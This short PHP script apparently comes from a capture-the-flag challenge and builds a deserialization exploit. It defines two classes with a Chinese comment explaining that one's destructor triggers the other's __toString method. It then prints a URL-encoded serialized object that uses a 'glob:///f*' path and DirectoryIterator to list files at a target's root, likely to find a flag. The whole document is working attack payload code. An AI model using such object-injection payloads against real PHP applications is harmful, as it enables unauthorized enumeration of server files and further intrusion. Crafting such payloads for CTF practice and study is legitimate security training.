```php
<?php
class gBoBg{
    public $name;
    public $file;
    public $coos;
}   


class w_wuw_w{
    public $aaa;
    public $key;
    public $file;
}


$w=new w_wuw_w();
$w->aaa=new gBoBg(); //通过类W_WUW_W中的析构函数来调用类gBoBg中的__toString魔术方法
$w->aaa->name="1";
$w->aaa->file="glob:///f*";
$w->aaa->coos="DirectoryIterator";
echo urlencode(serialize($w));
